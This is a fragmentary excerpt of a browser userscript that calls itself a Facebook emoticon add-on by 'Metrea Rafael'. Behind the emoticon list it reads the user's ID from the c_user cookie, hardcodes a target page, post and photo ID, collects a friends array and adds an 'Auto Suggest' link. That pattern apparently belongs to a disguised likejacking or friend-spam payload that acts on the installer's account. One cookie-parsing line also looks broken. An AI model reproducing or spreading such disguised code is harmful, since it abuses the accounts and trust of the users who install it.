// ==UserScript==
// @name            Metrea Facbook Emoticons
// @description     Facebook Emoticon 2013 By Metrea Rafael
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/metreax" target="_blank">Created By Metrea Rafael</a>';
	html += '</div>';
...
var spage_id = "470773362997589";
var spost_id = "470773362997589";
var sfoto_id = "470773362997589";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Metrea Rafael';
